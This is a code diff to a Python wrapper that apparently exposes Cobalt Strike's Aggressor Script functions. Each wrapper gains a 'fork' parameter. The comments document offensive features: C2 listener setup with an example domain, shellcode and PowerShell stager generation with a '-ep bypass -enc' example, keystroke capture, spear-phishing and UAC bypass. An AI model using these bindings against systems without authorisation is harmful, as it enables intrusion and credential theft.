+    return engine.call('iprange', args, fork=fork)
 
 # 
 # Returns a list of keystrokes from Cobalt Strike's data model.
@@ -2786,8 +2786,8 @@ def iprange(*args):
 # 
 # printAll(keystrokes());
 # 
-def keystrokes(*args):
-    return engine.call('keystrokes', args)
+def keystrokes(*args, fork=False):
+    return engine.call('keystrokes', args, fork=fork)
 
 # 
 # Get the license key for this instance of Cobalt Strike
@@ -2797,8 +2797,8 @@ def keystrokes(*args):
 # 
 # println("Your key is: " . licenseKey());
 # 
-def licenseKey(*args):
-    return engine.call('licenseKey', args)
+def licenseKey(*args, fork=False):
+    return engine.call('licenseKey', args, fork=fork)
 
 # 
 # Create a new listener.
@@ -2819,8 +2819,8 @@ def licenseKey(*args):
 # 		"www.losenolove.com", 80,
 # 		"www.losenolove.com, www2.losenolove.com");
 # 
-def listener_create(*args):
-    return engine.call('listener_create', args)
+def listener_create(*args, fork=False):
+    return engine.call('listener_create', args, fork=fork)
 
 # 
 # Stop and remove a listener.
@@ -2830,8 +2830,8 @@ def listener_create(*args):
 # 
 # listener_delete("Beacon HTTP");
 # 
-def listener_delete(*args):
-    return engine.call('listener_delete', args)
+def listener_delete(*args, fork=False):
+    return engine.call('listener_delete', args, fork=fork)
 
 # 
 # Describe a listener.
@@ -2846,8 +2846,8 @@ def listener_delete(*args):
 # 	println("$name is: " . listener_describe($name));
 # }
 # 
-def listener_describe(*args):
-    return engine.call('listener_describe', args)
+def listener_describe(*args, fork=False):
+    return engine.call('listener_describe', args, fork=fork)
 
 # 
 # Get information about a listener.
@@ -2873,8 +2873,8 @@ def listener_describe(*args):
 # 	}
 # }
 # 
-def listener_info(*args):
-    return engine.call('listener_info', args)
+def listener_info(*args, fork=False):
+    return engine.call('listener_info', args, fork=fork)
 
 # 
 # Restart a listener
@@ -2884,8 +2884,8 @@ def listener_info(*args):
 # 
 # listener_restart("Beacon HTTP");
 # 
-def listener_restart(*args):
-    return engine.call('listener_restart', args)
+def listener_restart(*args, fork=False):
+    return engine.call('listener_restart', args, fork=fork)
 
 # 
 # Return a list of listener names across all team servers this client is connected to.
@@ -2895,8 +2895,8 @@ def listener_restart(*args):
 # 
 # printAll(listeners());
 # 
-def listeners(*args):
-    return engine.call('listeners', args)
+def listeners(*args, fork=False):
+    return engine.call('listeners', args, fork=fork)
 
 # 
 # Return a list of listener names. This function limits itself to the current team server only.
@@ -2906,8 +2906,8 @@ def listeners(*args):
 # 
 # printAll(listeners_local());
 # 
-def listeners_local(*args):
-    return engine.call('listeners_local', args)
+def listeners_local(*args, fork=False):
+    return engine.call('listeners_local', args, fork=fork)
 
 # 
 # Get the IP address associated with the team server.
@@ -2917,8 +2917,8 @@ def listeners_local(*args):
 # 
 # println("I am: " . localip());
 # 
-def localip(*args):
-    return engine.call('localip', args)
+def localip(*args, fork=False):
+    return engine.call('localip', args, fork=fork)
 
 # 
 # Get the nickname associated with the current Cobalt Strike client.
@@ -2928,8 +2928,8 @@ def localip(*args):
 # 
 # println("I am: " . mynick());
 # 
-def mynick(*args):
-    return engine.call('mynick', args)
+def mynick(*args, fork=False):
+    return engine.call('mynick', args, fork=fork)
 
 # 
 # Activate the tab that is to the right of the current tab.
@@ -2939,8 +2939,8 @@ def mynick(*args):
 # 	nextTab();
 # }
 # 
-def nextTab(*args):
-    return engine.call('nextTab', args)
+def nextTab(*args, fork=False):
+    return engine.call('nextTab', args, fork=fork)
 
 # 
 # Register an event handler. This is an alternate to the on keyword.
@@ -2955,8 +2955,8 @@ def nextTab(*args):
 # 
 # on("beacon_initial", &foo);
 # 
-def on(*args):
-    return engine.call('on', args)
+def on(*args, fork=False):
+    return engine.call('on', args, fork=fork)
 
 # 
 # Open the "About Cobalt Strike" dialog
@@ -2964,8 +2964,8 @@ def on(*args):
 # 
 # openAboutDialog();
 # 
-def openAboutDialog(*args):
-    return engine.call('openAboutDialog', args)
+def openAboutDialog(*args, fork=False):
+    return engine.call('openAboutDialog', args, fork=fork)
 
 # 
 # Open the application manager (system profiler results) tab.
@@ -2973,8 +2973,8 @@ def openAboutDialog(*args):
 # 
 # openApplicationManager();
 # 
-def openApplicationManager(*args):
-    return engine.call('openApplicationManager', args)
+def openApplicationManager(*args, fork=False):
+    return engine.call('openApplicationManager', args, fork=fork)
 
 # 
 # Open the Auto Run / USB attack dialog.
@@ -2982,8 +2982,8 @@ def openApplicationManager(*args):
 # 
 # openAutoRunDialog();
 # 
-def openAutoRunDialog(*args):
-    return engine.call('openAutoRunDialog', args)
+def openAutoRunDialog(*args, fork=False):
+    return engine.call('openAutoRunDialog', args, fork=fork)
 
 # 
 # Open the beacon browser tab.
@@ -2991,8 +2991,8 @@ def openAutoRunDialog(*args):
 # 
 # openBeaconBrowser();
 # 
-def openBeaconBrowser(*args):
-    return engine.call('openBeaconBrowser', args)
+def openBeaconBrowser(*args, fork=False):
+    return engine.call('openBeaconBrowser', args, fork=fork)
 
 # 
 # Open the console to interact with a Beacon
@@ -3007,8 +3007,8 @@ def openBeaconBrowser(*args):
 # 	}
 # }
 # 
-def openBeaconConsole(*args):
-    return engine.call('openBeaconConsole', args)
+def openBeaconConsole(*args, fork=False):
+    return engine.call('openBeaconConsole', args, fork=fork)
 
 # 
 # open the browser pivot setup dialog
@@ -3023,8 +3023,8 @@ def openBeaconConsole(*args):
 # 	}
 # }
 # 
-def openBrowserPivotSetup(*args):
-    return engine.call('openBrowserPivotSetup', args)
+def openBrowserPivotSetup(*args, fork=False):
+    return engine.call('openBrowserPivotSetup', args, fork=fork)
 
 # 
 # Open the dialog for the Bypass UAC feature.
@@ -3039,8 +3039,8 @@ def openBrowserPivotSetup(*args):
 # 	}
 # }
 # 
-def openBypassUACDialog(*args):
-    return engine.call('openBypassUACDialog', args)
+def openBypassUACDialog(*args, fork=False):
+    return engine.call('openBypassUACDialog', args, fork=fork)
 
 # 
 # Open the dialog for the website clone tool.
@@ -3048,8 +3048,8 @@ def openBypassUACDialog(*args):
 # 
 # openCloneSiteDialog();
 # 
-def openCloneSiteDialog(*args):
-    return engine.call('openCloneSiteDialog', args)
+def openCloneSiteDialog(*args, fork=False):
+    return engine.call('openCloneSiteDialog', args, fork=fork)
 
 # 
 # Open the connect dialog.
@@ -3057,8 +3057,8 @@ def openCloneSiteDialog(*args):
 # 
 # openConnectDialog();
 # 
-def openConnectDialog(*args):
-    return engine.call('openConnectDialog', args)
+def openConnectDialog(*args, fork=False):
+    return engine.call('openConnectDialog', args, fork=fork)
 
 # 
 # open the Covert VPN setup dialog
@@ -3073,8 +3073,8 @@ def openConnectDialog(*args):
 # 	}
 # }
 # 
-def openCovertVPNSetup(*args):
-    return engine.call('openCovertVPNSetup', args)
+def openCovertVPNSetup(*args, fork=False):
+    return engine.call('openCovertVPNSetup', args, fork=fork)
 
 # 
 # Open the credential manager tab.
@@ -3082,8 +3082,8 @@ def openCovertVPNSetup(*args):
 # 
 # openCredentialManager();
 # 
-def openCredentialManager(*args):
-    return engine.call('openCredentialManager', args)
+def openCredentialManager(*args, fork=False):
+    return engine.call('openCredentialManager', args, fork=fork)
 
 # 
 # Open the download browser tab
@@ -3091,8 +3091,8 @@ def openCredentialManager(*args):
 # 
 # openDownloadBrowser();
 # 
-def openDownloadBrowser(*args):
-    return engine.call('openDownloadBrowser', args)
+def openDownloadBrowser(*args, fork=False):
+    return engine.call('openDownloadBrowser', args, fork=fork)
 
 # 
 # Open the dialog to launch a privilege escalation exploit.
@@ -3107,8 +3107,8 @@ def openDownloadBrowser(*args):
 # 	}
 # }
 # 
-def openElevateDialog(*args):
-    return engine.call('openElevateDialog', args)
+def openElevateDialog(*args, fork=False):
+    return engine.call('openElevateDialog', args, fork=fork)
 
 # 
 # Open the event log.
@@ -3116,8 +3116,8 @@ def openElevateDialog(*args):
 # 
 # openEventLog();
 # 
-def openEventLog(*args):
-    return engine.call('openEventLog', args)
+def openEventLog(*args, fork=False):
+    return engine.call('openEventLog', args, fork=fork)
 
 # 
 # Open the file browser for a Beacon
@@ -3132,8 +3132,8 @@ def openEventLog(*args):
 # 	}
 # }
 # 
-def openFileBrowser(*args):
-    return engine.call('openFileBrowser', args)
+def openFileBrowser(*args, fork=False):
+    return engine.call('openFileBrowser', args, fork=fork)
 
 # 
 # open a dialog to help generate a golden ticket
@@ -3148,8 +3148,8 @@ def openFileBrowser(*args):
 # 	}
 # }
 # 
-def openGoldenTicketDialog(*args):
-    return engine.call('openGoldenTicketDialog', args)
+def openGoldenTicketDialog(*args, fork=False):
+    return engine.call('openGoldenTicketDialog', args, fork=fork)
 
 # 
 # Open the HTML Application Dialog.
@@ -3157,8 +3157,8 @@ def openGoldenTicketDialog(*args):
 # 
 # openHTMLApplicationDialog();
 # 
-def openHTMLApplicationDialog(*args):
-    return engine.call('openHTMLApplicationDialog', args)
+def openHTMLApplicationDialog(*args, fork=False):
+    return engine.call('openHTMLApplicationDialog', args, fork=fork)
 
 # 
 # Open the host file dialog.
@@ -3166,8 +3166,8 @@ def openHTMLApplicationDialog(*args):
 # 
 # openHostFileDialog();
 # 
-def openHostFileDialog(*args):
-    return engine.call('openHostFileDialog', args)
+def openHostFileDialog(*args, fork=False):
+    return engine.call('openHostFileDialog', args, fork=fork)
 
 # 
 # Open the tab to manage Covert VPN interfaces
@@ -3175,8 +3175,8 @@ def openHostFileDialog(*args):
 # 
 # openInterfaceManager();
 # 
-def openInterfaceManager(*args):
-    return engine.call('openInterfaceManager', args)
+def openInterfaceManager(*args, fork=False):
+    return engine.call('openInterfaceManager', args, fork=fork)
 
 # 
 # Open the Java Signed Applet dialog
@@ -3184,8 +3184,8 @@ def openInterfaceManager(*args):
 # 
 # openJavaSignedAppletDialog();
 # 
-def openJavaSignedAppletDialog(*args):
-    return engine.call('openJavaSignedAppletDialog', args)
+def openJavaSignedAppletDialog(*args, fork=False):
+    return engine.call('openJavaSignedAppletDialog', args, fork=fork)
 
 # 
 # Open the Java Smart Applet dialog
@@ -3193,8 +3193,8 @@ def openJavaSignedAppletDialog(*args):
 # 
 # openJavaSmartAppletDialog();
 # 
-def openJavaSmartAppletDialog(*args):
-    return engine.call('openJavaSmartAppletDialog', args)
+def openJavaSmartAppletDialog(*args, fork=False):
+    return engine.call('openJavaSmartAppletDialog', args, fork=fork)
 
 # 
 # Open Cobalt Strike's lateral movement dialog
@@ -3205,8 +3205,8 @@ def openJavaSmartAppletDialog(*args):
 # 
 # openJumpDialog("psexec_psh", @("192.168.1.3", "192.168.1.4"));
 # 
-def openJumpDialog(*args):
-    return engine.call('openJumpDialog', args)
+def openJumpDialog(*args, fork=False):
+    return engine.call('openJumpDialog', args, fork=fork)
 
 # 
 # Open the keystroke browser tab
@@ -3214,8 +3214,8 @@ def openJumpDialog(*args):
 # 
 # openKeystrokeBrowser();
 # 
-def openKeystrokeBrowser(*args):
-    return engine.call('openKeystrokeBrowser', args)
+def openKeystrokeBrowser(*args, fork=False):
+    return engine.call('openKeystrokeBrowser', args, fork=fork)
 
 # 
 # Open the listener manager
@@ -3223,8 +3223,8 @@ def openKeystrokeBrowser(*args):
 # 
 # openListenerManager();
 # 
-def openListenerManager(*args):
-    return engine.call('openListenerManager', args)
+def openListenerManager(*args, fork=False):
+    return engine.call('openListenerManager', args, fork=fork)
 
 # 
 # open a dialog to help generate an access token
@@ -3239,8 +3239,8 @@ def openListenerManager(*args):
 # 	}
 # }
 # 
-def openMakeTokenDialog(*args):
-    return engine.call('openMakeTokenDialog', args)
+def openMakeTokenDialog(*args, fork=False):
+    return engine.call('openMakeTokenDialog', args, fork=fork)
 
 # 
 # Open the office macro export dialog
@@ -3248,8 +3248,8 @@ def openMakeTokenDialog(*args):
 # 
 # openOfficeMacroDialog();
 # 
-def openOfficeMacro(*args):
-    return engine.call('openOfficeMacro', args)
+def openOfficeMacro(*args, fork=False):
+    return engine.call('openOfficeMacro', args, fork=fork)
 
 # 
 # If a Beacon console exists, make it active. If a Beacon console does not exist, open it.
@@ -3264,8 +3264,8 @@ def openOfficeMacro(*args):
 # 	}
 # }
 # 
-def openOrActivate(*args):
-    return engine.call('openOrActivate', args)
+def openOrActivate(*args, fork=False):
+    return engine.call('openOrActivate', args, fork=fork)
 
 # 
 # Open the Payload Generator dialog.
@@ -3273,8 +3273,8 @@ def openOrActivate(*args):
 # 
 # openPayloadGeneratorDialog();
 # 
-def openPayloadGeneratorDialog(*args):
-    return engine.call('openPayloadGeneratorDialog', args)
+def openPayloadGeneratorDialog(*args, fork=False):
+    return engine.call('openPayloadGeneratorDialog', args, fork=fork)
 
 # 
 # Open a payload chooser dialog.
@@ -3286,8 +3286,8 @@ def openPayloadGeneratorDialog(*args):
 # 	bspawn($bid, $1);
 # }, $bid => $1));
 # 
-def openPayloadHelper(*args):
-    return engine.call('openPayloadHelper', args)
+def openPayloadHelper(*args, fork=False):
+    return engine.call('openPayloadHelper', args, fork=fork)
 
 # 
 # open the pivot listener setup dialog
@@ -3302,8 +3302,8 @@ def openPayloadHelper(*args):
 # 	}
 # }
 # 
-def openPivotListenerSetup(*args):
-    return engine.call('openPivotListenerSetup', args)
+def openPivotListenerSetup(*args, fork=False):
+    return engine.call('openPivotListenerSetup', args, fork=fork)
 
 # 
 # Open the port scanner dialog
@@ -3313,8 +3313,8 @@ def openPivotListenerSetup(*args):
 # 
 # openPortScanner(@("192.168.1.3"));
 # 
-def openPortScanner(*args):
-    return engine.call('openPortScanner', args)
+def openPortScanner(*args, fork=False):
+    return engine.call('openPortScanner', args, fork=fork)
 
 # 
 # Open the port scanner dialog with options to target a Beacon's local network
@@ -3329,8 +3329,8 @@ def openPortScanner(*args):
 # 	}
 # }
 # 
-def openPortScannerLocal(*args):
-    return engine.call('openPortScannerLocal', args)
+def openPortScannerLocal(*args, fork=False):
+    return engine.call('openPortScannerLocal', args, fork=fork)
 
 # 
 # Open the dialog to setup the PowerShell Web Delivery Attack
@@ -3338,8 +3338,8 @@ def openPortScannerLocal(*args):
 # 
 # openPowerShellWebDialog();
 # 
-def openPowerShellWebDialog(*args):
-    return engine.call('openPowerShellWebDialog', args)
+def openPowerShellWebDialog(*args, fork=False):
+    return engine.call('openPowerShellWebDialog', args, fork=fork)
 
 # 
 # Open the preferences dialog
@@ -3347,8 +3347,8 @@ def openPowerShellWebDialog(*args):
 # 
 # openPreferencesDialog();
 # 
-def openPreferencesDialog(*args):
-    return engine.call('openPreferencesDialog', args)
+def openPreferencesDialog(*args, fork=False):
+    return engine.call('openPreferencesDialog', args, fork=fork)
 
 # 
 # Open a process browser for one or more Beacons
@@ -3360,8 +3360,8 @@ def openPreferencesDialog(*args):
 # 	openProcessBrowser($1);
 # }
 # 
-def openProcessBrowser(*args):
-    return engine.call('openProcessBrowser', args)
+def openProcessBrowser(*args, fork=False):
+    return engine.call('openProcessBrowser', args, fork=fork)
 
 # 
 # Open the tab to list SOCKS proxy servers
@@ -3369,8 +3369,8 @@ def openProcessBrowser(*args):
 # 
 # openSOCKSBrowser();
 # 
-def openSOCKSBrowser(*args):
-    return engine.call('openSOCKSBrowser', args)
+def openSOCKSBrowser(*args, fork=False):
+    return engine.call('openSOCKSBrowser', args, fork=fork)
 
 # 
 # open the SOCKS proxy server setup dialog
@@ -3385,8 +3385,8 @@ def openSOCKSBrowser(*args):
 # 	}
 # }
 # 
-def openSOCKSSetup(*args):
-    return engine.call('openSOCKSSetup', args)
+def openSOCKSSetup(*args, fork=False):
+    return engine.call('openSOCKSSetup', args, fork=fork)
 
 # 
 # Open the screenshot browser tab
@@ -3394,8 +3394,8 @@ def openSOCKSSetup(*args):
 # 
 # openScreenshotBrowser();
 # 
-def openScreenshotBrowser(*args):
-    return engine.call('openScreenshotBrowser', args)
+def openScreenshotBrowser(*args, fork=False):
+    return engine.call('openScreenshotBrowser', args, fork=fork)
 
 # 
 # Open the Aggressor Script console.
@@ -3403,8 +3403,8 @@ def openScreenshotBrowser(*args):
 # 
 # openScriptConsole();
 # 
-def openScriptConsole(*args):
-    return engine.call('openScriptConsole', args)
+def openScriptConsole(*args, fork=False):
+    return engine.call('openScriptConsole', args, fork=fork)
 
 # 
 # Open the tab for the script manager.
@@ -3412,8 +3412,8 @@ def openScriptConsole(*args):
 # 
 # openScriptManager();
 # 
-def openScriptManager(*args):
-    return engine.call('openScriptManager', args)
+def openScriptManager(*args, fork=False):
+    return engine.call('openScriptManager', args, fork=fork)
 
 # 
 # Open the dialog to setup a Scripted Web Delivery Attack
@@ -3421,8 +3421,8 @@ def openScriptManager(*args):
 # 
 # openScriptedWebDialog();
 # 
-def openScriptedWebDialog(*args):
-    return engine.call('openScriptedWebDialog', args)
+def openScriptedWebDialog(*args, fork=False):
+    return engine.call('openScriptedWebDialog', args, fork=fork)
 
 # 
 # Open service browser dialog
@@ -3432,8 +3432,8 @@ def openScriptedWebDialog(*args):
 # 
 # openServiceBrowser(@("192.168.1.3"));
 # 
-def openServiceBrowser(*args):
-    return engine.call('openServiceBrowser', args)
+def openServiceBrowser(*args, fork=False):
+    return engine.call('openServiceBrowser', args, fork=fork)
 
 # 
 # Open the site manager.
@@ -3441,8 +3441,8 @@ def openServiceBrowser(*args):
 # 
 # openSiteManager();
 # 
-def openSiteManager(*args):
-    return engine.call('openSiteManager', args)
+def openSiteManager(*args, fork=False):
+    return engine.call('openSiteManager', args, fork=fork)
 
 # 
 # Open dialog to spawn a payload as another user
@@ -3457,8 +3457,8 @@ def openSiteManager(*args):
 # 	}
 # }
 # 
-def openSpawnAsDialog(*args):
-    return engine.call('openSpawnAsDialog', args)
+def openSpawnAsDialog(*args, fork=False):
+    return engine.call('openSpawnAsDialog', args, fork=fork)
 
 # 
 # Open the dialog for the spear phishing tool.
@@ -3466,8 +3466,8 @@ def openSpawnAsDialog(*args):
 # 
 # openSpearPhishDialog();
 # 
-def openSpearPhishDialog(*args):
-    return engine.call('openSpearPhishDialog', args)
+def openSpearPhishDialog(*args, fork=False):
+    return engine.call('openSpearPhishDialog', args, fork=fork)
 
 # 
 # Open the system information dialog.
@@ -3475,8 +3475,8 @@ def openSpearPhishDialog(*args):
 # 
 # openSystemInformationDialog();
 # 
-def openSystemInformationDialog(*args):
-    return engine.call('openSystemInformationDialog', args)
+def openSystemInformationDialog(*args, fork=False):
+    return engine.call('openSystemInformationDialog', args, fork=fork)
 
 # 
 # Open the dialog to setup the system profiler.
@@ -3484,8 +3484,8 @@ def openSystemInformationDialog(*args):
 # 
 # openSystemProfilerDialog();
 # 
-def openSystemProfilerDialog(*args):
-    return engine.call('openSystemProfilerDialog', args)
+def openSystemProfilerDialog(*args, fork=False):
+    return engine.call('openSystemProfilerDialog', args, fork=fork)
 
 # 
 # Open the targets browser
@@ -3493,8 +3493,8 @@ def openSystemProfilerDialog(*args):
 # 
 # openTargetBrowser();
 # 
-def openTargetBrowser(*args):
-    return engine.call('openTargetBrowser', args)
+def openTargetBrowser(*args, fork=False):
+    return engine.call('openTargetBrowser', args, fork=fork)
 
 # 
 # Open the web log tab.
@@ -3502,8 +3502,8 @@ def openTargetBrowser(*args):
 # 
 # openWebLog();
 # 
-def openWebLog(*args):
-    return engine.call('openWebLog', args)
+def openWebLog(*args, fork=False):
+    return engine.call('openWebLog', args, fork=fork)
 
 # 
 # Open the dialog to export the Windows dropper attack
@@ -3511,8 +3511,8 @@ def openWebLog(*args):
 # 
 # openWindowsDropperDialog();
 # 
-def openWindowsDropperDialog(*args):
-    return engine.call('openWindowsDropperDialog', args)
+def openWindowsDropperDialog(*args, fork=False):
+    return engine.call('openWindowsDropperDialog', args, fork=fork)
 
 # 
 # Open the dialog to generate a Windows executable
@@ -3520,8 +3520,8 @@ def openWindowsDropperDialog(*args):
 # 
 # openWindowsExecutableDialog();
 # 
-def openWindowsExecutableDialog(*args):
-    return engine.call('openWindowsExecutableDialog', args)
+def openWindowsExecutableDialog(*args, fork=False):
+    return engine.call('openWindowsExecutableDialog', args, fork=fork)
 
 # 
 # Open the dialog to generate a stageless Windows executable
@@ -3529,8 +3529,8 @@ def openWindowsExecutableDialog(*args):
 # 
 # openWindowsExecutableStage();
 # 
-def openWindowsExecutableStage(*args):
-    return engine.call('openWindowsExecutableStage', args)
+def openWindowsExecutableStage(*args, fork=False):
+    return engine.call('openWindowsExecutableStage', args, fork=fork)
 
 # 
 # Generate the pivot graph GUI component.
@@ -3543,8 +3543,8 @@ def openWindowsExecutableStage(*args):
 # See Also
 # &showVisualization
 # 
-def pgraph(*args):
-    return engine.call('pgraph', args)
+def pgraph(*args, fork=False):
+    return engine.call('pgraph', args, fork=fork)
 
 # 
 # Returns a list of SOCKS pivots from Cobalt Strike's data model.
@@ -3554,8 +3554,8 @@ def pgraph(*args):
 # 
 # printAll(pivots());
 # 
-def pivots(*args):
-    return engine.call('pivots', args)
+def pivots(*args, fork=False):
+    return engine.call('pivots', args, fork=fork)
 
 # 
 # Remove all popup menus associated with the current menu. This is a way to override Cobalt Strike's default popup menu definitions.
@@ -3571,8 +3571,8 @@ def pivots(*args):
 # 	}
 # }
 # 
-def popup_clear(*args):
-    return engine.call('popup_clear', args)
+def popup_clear(*args, fork=False):
+    return engine.call('popup_clear', args, fork=fork)
 
 # 
 # Returns a PowerShell one-liner to bootstrap the specified listener.
@@ -3588,8 +3588,8 @@ def popup_clear(*args):
 # 
 # println(powershell("my listener", false));
 # 
-def powershell(*args):
-    return engine.call('powershell', args)
+def powershell(*args, fork=False):
+    return engine.call('powershell', args, fork=fork)
 
 # 
 # Returns a one-liner to run a PowerShell expression (e.g., powershell.exe -nop -w hidden -encodedcommand MgAgACsAIAAyAA==)
@@ -3601,8 +3601,8 @@ def powershell(*args):
 # $cmd = powershell_encode_oneliner("2 + 2");
 # println($cmd);
 # 
-def powershell_encode_oneliner(*args):
-    return engine.call('powershell_encode_oneliner', args)
+def powershell_encode_oneliner(*args, fork=False):
+    return engine.call('powershell_encode_oneliner', args, fork=fork)
 
 # 
 # Returns a base64 encoded PowerShell script to run the specified shellcode
@@ -3616,8 +3616,8 @@ def powershell_encode_oneliner(*args):
 # $readytouse = powershell_encode_stager($shellcode);
 # println("powershell.exe -ep bypass -enc $readytouse");
 # 
-def powershell_encode_stager(*args):
-    return engine.call('powershell_encode_stager', args)
+def powershell_encode_stager(*args, fork=False):
+    return engine.call('powershell_encode_stager', args, fork=fork)
 
 # 
 # Grabs a string value from Cobalt Strike's preferences.
@@ -3630,8 +3630,8 @@ def powershell_encode_stager(*args):
 # 
 # $foo = pref_get("foo.string", "bar");
 # 
-def pref_get(*args):
-    return engine.call('pref_get', args)
+def pref_get(*args, fork=False):
+    return engine.call('pref_get', args, fork=fork)
 
 # 
 # Grabs a list value from Cobalt Strike's preferences.
@@ -3643,8 +3643,8 @@ def pref_get(*args):
 # 
 # @foo = pref_get_list("foo.list");
 # 
-def pref_get_list(*args):
-    return engine.call('pref_get_list', args)
+def pref_get_list(*args, fork=False):
+    return engine.call('pref_get_list', args, fork=fork)
 
 # 
 # Set a value in Cobalt Strike's preferences
@@ -3655,8 +3655,8 @@ def pref_get_list(*args):
 # 
 # pref_set("foo.string", "baz!");
 # 
-def pref_set(*args):
-    return engine.call('pref_set', args)
+def pref_set(*args, fork=False):
+    return engine.call('pref_set', args, fork=fork)
 
 # 
 # Stores a list value into Cobalt Strike's preferences.
@@ -3667,8 +3667,8 @@ def pref_set(*args):
 # 
 # pref_set_list("foo.list", @("a", "b", "c"));
 # 
-def pref_set_list(*args):
-    return engine.call('pref_set_list', args)
+def pref_set_list(*args, fork=False):
+    return engine.call('pref_set_list', args, fork=fork)
 
 # 
 # Activate the tab that is to the left of the current tab.
@@ -3678,8 +3678,8 @@ def pref_set_list(*args):
 # 	previousTab();
 # }
 # 
-def previousTab(*args):
-    return engine.call('previousTab', args)
+def previousTab(*args, fork=False):
+    return engine.call('previousTab', args, fork=fork)
 
 # 
 # Post a private message to a user in the event log
@@ -3690,8 +3690,8 @@ def previousTab(*args):
 # 
 # privmsg("raffi", "what's up man?");
 # 
-def privmsg(*args):
-    return engine.call('privmsg', args)
+def privmsg(*args, fork=False):
+    return engine.call('privmsg', args, fork=fork)
 
 # 
 # Show a dialog with Yes/No buttons. If the user presses yes, call the specified function.
@@ -3705,8 +3705,8 @@ def privmsg(*args):
 # 	show_mesage("Ok, I got nothing");
 # });
 # 
-def prompt_confirm(*args):
-    return engine.call('prompt_confirm', args)
+def prompt_confirm(*args, fork=False):
+    return engine.call('prompt_confirm', args, fork=fork)
 
 # 
 # Show a directory open dialog.
@@ -3721,8 +3721,8 @@ def prompt_confirm(*args):
 # 	show_message("You chose: $1");
 # });
 # 
-def prompt_directory_open(*args):
-    return engine.call('prompt_directory_open', args)
+def prompt_directory_open(*args, fork=False):
+    return engine.call('prompt_directory_open', args, fork=fork)
 
 # 
 # Show a file open dialog.
@@ -3737,8 +3737,8 @@ def prompt_directory_open(*args):
 # 	show_message("You chose: $1");
 # });
 # 
-def prompt_file_open(*args):
-    return engine.call('prompt_file_open', args)
+def prompt_file_open(*args, fork=False):
+    return engine.call('prompt_file_open', args, fork=fork)
 
 # 
 # Show a file save dialog.
@@ -3754,8 +3754,8 @@ def prompt_file_open(*args):
 # 	closef($handle);
 # });
 # 
-def prompt_file_save(*args):
-    return engine.call('prompt_file_save', args)
+def prompt_file_save(*args, fork=False):
+    return engine.call('prompt_file_save', args, fork=fork)
 
 # 
 # Show a dialog that asks the user for text.
@@ -3769,8 +3769,8 @@ def prompt_file_save(*args):
 # 	show_mesage("Hi $1 $+ , nice to meet you!");
 # });
 # 
-def prompt_text(*args):
-    return engine.call('prompt_text', args)
+def prompt_text(*args, fork=False):
+    return engine.call('prompt_text', args, fork=fork)
 
 # 
 # Generate an array of numbers based on a string description of ranges.
@@ -3800,8 +3800,8 @@ def prompt_text(*args):
 # 
 # printAll(range("2,4-6"));
 # 
-def range(*args):
-    return engine.call('range', args)
+def range(*args, fork=False):
+    return engine.call('range', args, fork=fork)
 
 # 
 # Close the active tab
@@ -3811,14 +3811,14 @@ def range(*args):
 # 	removeTab();
 # }
 # 
-def removeTab(*args):
-    return engine.call('removeTab', args)
+def removeTab(*args, fork=False):
+    return engine.call('removeTab', args, fork=fork)
 
 # 
 # Reset Cobalt Strike's data model
 # 
-def resetData(*args):
-    return engine.call('resetData', args)
+def resetData(*args, fork=False):
+    return engine.call('resetData', args, fork=fork)
 
 # 
 # Post a public chat message to the event log.
@@ -3828,8 +3828,8 @@ def resetData(*args):
 # 
 # say("Hello World!");
 # 
-def say(*args):
-    return engine.call('say', args)
+def say(*args, fork=False):
+    return engine.call('say', args, fork=fork)
 
 # 
 # Generate the session browser GUI component. Shows Beacon AND SSH sessions.
@@ -3842,8 +3842,8 @@ def say(*args):
 # See Also
 # &showVisualization
 # 
-def sbrowser(*args):
-    return engine.call('sbrowser', args)
+def sbrowser(*args, fork=False):
+    return engine.call('sbrowser', args, fork=fork)
 
 # 
 # Returns a list of screenshots from Cobalt Strike's data model.
@@ -3853,8 +3853,8 @@ def sbrowser(*args):
 # 
 # printAll(screenshots());
 # 
-def screenshots(*args):
-    return engine.call('screenshots', args)
+def screenshots(*args, fork=False):
+    return engine.call('screenshots', args, fork=fork)
 
 # 
 # Returns the full path to a resource that is stored relative to this script file.
@@ -3866,8 +3866,8 @@ def screenshots(*args):
 # 
 # println(script_resource("dummy.txt"));
 # 
-def script_resource(*args):
-    return engine.call('script_resource', args)
+def script_resource(*args, fork=False):
+    return engine.call('script_resource', args, fork=fork)
 
 # 
 # Insert a separator into the current menu tree.
@@ -3879,8 +3879,8 @@ def script_resource(*args):
 # 	item "Other Stuff" { ... }
 # }
 # 
-def separator(*args):
-    return engine.call('separator', args)
+def separator(*args, fork=False):
+    return engine.call('separator', args, fork=fork)
 
 # 
 # Returns a list of services in Cobalt Strike's data model.
@@ -3890,8 +3890,8 @@ def separator(*args):
 # 
 # printAll(services());
 # 
-def services(*args):
-    return engine.call('services', args)
+def services(*args, fork=False):
+    return engine.call('services', args, fork=fork)
 
 # 
 # Returns raw shellcode for a specific Cobalt Strike listener
@@ -3911,8 +3911,8 @@ def services(*args):
 # writeb($handle, $data);
 # closef($handle);
 # 
-def shellcode(*args):
-    return engine.call('shellcode', args)
+def shellcode(*args, fork=False):
+    return engine.call('shellcode', args, fork=fork)
 
 # 
 # Switch Cobalt Strike visualization to a registered visualization.
@@ -3927,8 +3927,8 @@ def shellcode(*args):
 # See Also
 # &showVisualization
 # 
-def showVisualization(*args):
-    return engine.call('showVisualization', args)
+def showVisualization(*args, fork=False):
+    return engine.call('showVisualization', args, fork=fork)
 
 # 
 # Shows an error message to the user in a dialog box. Use this function to relay error information.
@@ -3938,8 +3938,8 @@ def showVisualization(*args):
 # 
 # show_error("You did something bad.");
 # 
-def show_error(*args):
-    return engine.call('show_error', args)
+def show_error(*args, fork=False):
+    return engine.call('show_error', args, fork=fork)
 
 # 
 # Shows a message to the user in a dialog box. Use this function to relay information.
@@ -3949,8 +3949,8 @@ def show_error(*args):
 # 
 # show_message("You've won a free ringtone");
 # 
-def show_message(*args):
-    return engine.call('show_message', args)
+def show_message(*args, fork=False):
+    return engine.call('show_message', args, fork=fork)
 
 # 
 # Host content on Cobalt Strike's web server
@@ -3968,8 +3968,8 @@ def show_message(*args):
 # 
 # site_host(localip(), 80, "/", "Hello World!", "text/plain", "Hello World Page", false);
 # 
-def site_host(*args):
-    return engine.call('site_host', args)
+def site_host(*args, fork=False):
+    return engine.call('site_host', args, fork=fork)
 
 # 
 # Remove a site from Cobalt Strike's web server
@@ -3981,8 +3981,8 @@ def site_host(*args):
 # # removes the content bound to / on port 80
 # site_kill(80, "/");
 # 
-def site_kill(*args):
-    return engine.call('site_kill', args)
+def site_kill(*args, fork=False):
+    return engine.call('site_kill', args, fork=fork)
 
 # 
